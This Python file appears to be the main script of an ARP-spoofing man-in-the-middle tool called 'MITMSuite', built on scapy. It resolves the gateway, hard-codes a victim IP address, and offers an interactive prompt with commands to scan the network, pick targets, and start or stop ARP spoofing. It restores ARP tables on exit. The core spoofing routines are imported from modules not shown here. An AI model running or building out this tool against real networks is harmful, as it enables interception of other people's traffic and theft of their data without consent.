from scapy.all import *
import threading
from scapy.layers.l2 import *
import config
from config import *
from commands import *
from arp import *

commands = {
    "scan" : list_network,
    "set_target" : set_target,
    "show_targets" : show_targets,
    "start_spoof" : arp_spoof,
    "stop_spoof" : stop_arp_spoofing
}

def main():
    config.gateway_ip = conf.route.route("0.0.0.0")[2]
    print(config.gateway_ip)
    config.gateway_mac = get_mac(config.gateway_ip)
    victim_ip = "192.168.10.133"
    victim_mac = get_mac(victim_ip)
    config.my_mac = get_if_hwaddr(conf.iface)
    my_ip = get_if_addr(conf.iface)
    print("Welcome to MITMSuite")
    try:
        # forwading_thread = threading.Thread(target=enable_forwarding, args=(victim_mac, gateway_mac, victim_ip, my_mac))
        # forwading_thread.deamon = True
        # forwading_thread.start()
        # spoof(victim_ip, gateway_ip, victim_mac, gateway_mac, my_mac)
        while True:
            command, *args = input(">> ").split()
            if command in commands:
                commands[command](args)
    except KeyboardInterrupt:
        pass
    finally:
        for target in config.targets:
            restore_arp(target["mac"], config.gateway_mac, target["ip"], config.gateway_ip)

if __name__ == "__main__":
    main()